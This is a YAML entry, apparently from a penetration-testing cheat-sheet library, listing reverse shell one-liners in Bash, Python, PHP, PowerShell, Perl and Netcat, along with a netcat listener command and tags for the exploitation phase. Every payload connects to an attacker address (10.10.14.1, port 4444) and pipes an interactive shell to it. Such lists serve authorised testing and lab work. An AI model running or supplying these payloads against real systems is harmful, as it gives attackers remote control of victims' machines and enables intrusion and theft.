---
description: |
  Common reverse shell one-liners for various languages.
  Set up listener first: nc -lvnp 4444

  Reference values:
    Attacker IP: 10.10.14.1
    Port: 4444
command: |
  # Bash
  bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

  # Python
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

  # PHP
  php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

  # PowerShell
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

  # Perl
  perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

  # Netcat (with -e)
  nc 10.10.14.1 4444 -e /bin/bash

  # Netcat (without -e)
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.1 4444 >/tmp/f
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services: []
items:
  - No_Creds
techniques:
  - Reverse_Shell
network_position:
  - External
  - Internal
  - Local
references:
  - https://www.revshells.com/
---
